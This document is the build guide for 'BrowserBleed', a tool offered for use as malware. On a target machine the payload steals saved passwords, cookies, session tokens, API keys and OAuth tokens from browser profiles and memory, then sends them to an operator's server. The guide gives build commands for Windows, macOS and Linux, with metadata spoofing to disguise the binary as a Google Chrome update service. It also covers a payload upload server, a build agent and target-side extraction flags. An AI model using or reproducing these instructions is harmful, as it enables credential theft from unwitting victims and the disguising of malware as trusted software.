Build

Build credential extraction payloads for Windows, macOS, and Linux.

Overview

The BrowserBleed payload is a Python script compiled to a standalone binary with PyInstaller. When executed on a target machine, it extracts saved passwords, cookies, session tokens, API keys, and OAuth tokens from browser profile directories and running browser processes, then POSTs an encrypted report to your server.

All build scripts read DOMAIN and BB_API_KEY from deploy/config automatically. You do not need to manually embed any URLs or keys.

Run the build script on the same OS as your target. Windows payloads must be built on Windows; macOS payloads on a Mac; Linux payloads on Linux. Cross-OS builds are not supported — PyInstaller must run natively.

Option A — Local build

Run the build script directly from the repo root. Use the Build Command generator on the Payloads page to compose the exact command.

Windows (PowerShell)

# Basic build — chrome preset
.\build_windows.ps1 -Preset chrome

# Custom exe name
.\build_windows.ps1 -Preset chrome -ExeName chrome_updater

# With metadata spoofing (shows in file properties)
.\build_windows.ps1 -Preset chrome -Company "Google LLC" -FileDesc "Chrome Update Service"

# Custom icon
.\build_windows.ps1 -Preset chrome -IconFile .\icons\chrome.ico

# Build and upload to payload server in one step
.\build_windows.ps1 -Preset chrome -Upload

macOS (Bash)

./build_mac.sh --preset chrome
./build_mac.sh --preset chrome --name google-chrome
./build_mac.sh --preset chrome --upload

Linux (Bash — requires sudo)

sudo ./build_linux.sh --preset chrome
sudo ./build_linux.sh --preset chrome --name google-chrome
sudo ./build_linux.sh --preset chrome --upload

The --upload / -Upload flag POSTs the built binary to /payloads on your server after a successful build. The server returns HTTP 303 on success.

Option B — Build agent

The build agent (build_agent.py) polls the server's build queue and builds jobs automatically. Queue a build from the Build Command section on the Payloads page, then run the agent on your Windows machine. 

python build_agent.py

The agent polls /builds/claim every 5 seconds. When a pending job appears, it runs build_windows.ps1 with the queued parameters and uploads the resulting exe via /builds/{id}/complete.

The build agent only builds Windows payloads — it calls build_windows.ps1 internally. Queue macOS and Linux builds manually using the local build scripts.

Option C — Manual upload

If you have a pre-built binary, upload it directly via the Manual Upload section on the Payloads page. Accepts any binary up to 256 MB. The filename is used as-is.

Target flags

These flags are passed to the payload when it runs on the target machine — not to the build script. Append them to the run command shown in the Build Command section.

FlagDescription
--memory-only Only extract credentials from running browser processes. Skips all disk-based credential stores. Use when you want only live session tokens (faster, smaller output).
--disk-only Only extract from saved browser profile directories. Skips process memory. Use when browsers are not open or you prefer saved passwords over session tokens.
--verify Validate each extracted credential before including it in the report. Slower but produces cleaner output with fewer false positives.

Without any flags, BrowserBleed extracts from both memory and disk. The hit count in the report reflects all unique credentials found.

Tips

Encoding: The Windows build script always uses -Encoding utf8 when reading the Python source. Never pipe or edit the source with a tool that changes the encoding — box-drawing characters in string literals will be corrupted.

Hit count variation: Normal. Session ID hits from open browser tabs can be 400+ or as low as 10 depending on what the target has open. Core credentials (saved passwords, API keys, OAuth tokens) are stable across runs.

PyInstaller virtualenv: Each build script creates a fresh virtualenv in a temp directory. If a build fails partway through, delete the build/ and dist/ directories in the repo root before retrying.
